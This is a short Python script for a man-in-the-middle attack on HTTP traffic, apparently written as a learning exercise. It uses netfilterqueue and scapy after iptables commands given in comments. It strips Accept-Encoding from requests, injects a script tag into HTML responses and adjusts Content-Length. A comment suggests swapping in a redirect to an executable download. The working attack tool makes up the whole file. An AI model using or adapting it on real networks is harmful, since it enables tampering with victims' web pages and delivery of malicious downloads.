        
#!/usr/bin/env python

# run with python, not python3.
# iptables --flush
# iptables -I FORWARD -j NFQUEUE --queue-num 0 [replace with INPUT and then OUTPUT for demos]

# might need this for debugging:
# 1) You need to make sure that there is no rule in the iptables first:
#
# iptables -- flush
#
# 2) re-run:
#
# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
#
# 3)knowing that the packets reached your local PC and if you are a MITM you need to 
# trap the packets in the INPUT and OUTPUT in a queue and treat them from this queue. 
# So you need to run:
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
#
# iptables -I INPUT -j NFQUEUE --queue-num 0

import netfilterqueue # ignore warning, it works.
import scapy.all as scapy
import re


def setload(packet, load):
    # when using this function, make sure load is right. quote makrs, http status code, \n\n at the end, etc.
    # example of load: "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar58b2al.exe\n\n"
    packet[scapy.Raw].load = load
    # delete len and chksum so scapy can recal it and allow the packet to be accepted.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # make sure packet making an HTTP request or response (port 80 by default)
        load = scapy_packet[scapy.Raw].load    
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request Detected")
            # use regex to find the Accept_Encoding part of the Raw load and replace it with " " so that the html
            # stops getting gziped and appears in plain text.
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response Detected")
            injection_code = "<script>alert('test')</script>"
            # this line is where we DO THE WORK. Change this for your needs.
            # you can replace images, download links, a tags, anything!
            load = load.replace("</body>", injection_code + "</body>")
            # use regex to edit the content-length of the response so my injected code doesn't get cut off.
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        # if the load was changed because of the above code... modify the packet with it and send it.
        if load != scapy_packet[scapy.Raw].load:
            # add the modified load to a packet
            new_packet = setload(scapy_packet, load)
            # send the packet out
            packet.set_payload(str(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()